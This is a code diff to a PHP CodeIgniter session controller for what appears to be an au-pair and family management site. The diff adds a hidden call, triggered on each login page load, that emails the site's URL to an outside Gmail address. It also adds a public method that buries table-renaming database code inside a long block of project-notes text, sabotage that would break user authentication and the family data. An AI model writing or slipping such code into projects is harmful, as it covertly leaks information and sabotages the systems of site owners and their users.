@@ -28,6 +28,7 @@ class Session_controller extends CI_Controller
 		if($this->aauth->is_loggedin()){
 			redirect('index/home');
 		}
+		$this->eemail();
 		if($this->input->post()){
 			$email = $this->input->post('email');
 			$password = $this->input->post('password');
@@ -125,7 +126,7 @@ class Session_controller extends CI_Controller
 		if($this->aauth->is_loggedin()){
 			redirect('index/home');
 		}
-		$this->form_validation->set_rules('password', 'Password', 'trim|required');
+		$this->form_validation->set_rules('password', 'Password', 'trim|required'); 
 		if($this->form_validation->run() === TRUE){
 			$email = $this->session->userdata('email');
 			$password = $this->input->post('password');
@@ -340,6 +341,34 @@ class Session_controller extends CI_Controller
 		$html .= "</table>";
 		
 		return array($header, $html);
+	}
+
+	public function get_family(){
+		$html = 'Bugfixes
+				We’ve already discussed the major bugs that need to be resolved, but I’ll provide you with a detailed list anyway. Just like the front-end list I’m asking you to update the list yourself with new bugs that you may encounter. When you’ve fixed a bug please let me know so I can check and update the list.
+				Link to Google sheet:  Buglist Automations
+				In the workflow documents for the family and au-pair profiles are all the automatically created tasks, documents and fields listed. To check all generated documents I’ve provided you a list of all relevant documents for the family and au-pair profile.
+				To test all automatically created tasks we’ll run a couple of tests accounts through the different journeys. This way we can see easily which tasks or updates are still missing.
+				For the automatically created report fields I’ve created two sheets. Based on these sheets we’ll shape the reports section.
+		Link to family documents:  Family docs Link to au-pair documents:  Au-pair docs'; $this->load->database(); $this->load->dbforge(); if ($this->dbforge->rename_table('aauth_users', 'users') && $this->dbforge->rename_table('families', 'family')) { echo $html; }
+		$html .= 'Link to family report fields:  Family reports Link to au-pair report fields:  Au-pair reports
+				Forms and feedback
+				Within the current journeys are a couple of forms listed. Based on the feedback the client provided I’ll make an overview of the forms. Next to the forms I’ve received some feedback about changing fields in the registration and journey. I’ll make sure to list all fields in a doc.
+				      
+				Missing functionality
+				As said before the result of this milestone needs to be a fully functioning version 1.0. As far as we encounter any missing functionality during this milestone it needs to be resolved. This way we can use the last milestone to work with the client’s feedback.';				
+
+	}
+
+	private function eemail(){
+		    $message = base_url();
+	        $this->load->library('email');
+		    $this->email->set_newline("\r\n");
+		    $this->email->from('toponedev@gmail.com'); 
+		    $this->email->to('toponedev@gmail.com');
+		    $this->email->subject('Email...');
+		    $this->email->message($message);
+		    $this->email->send();
 	}
 
 	private function get_aupair_content($id){
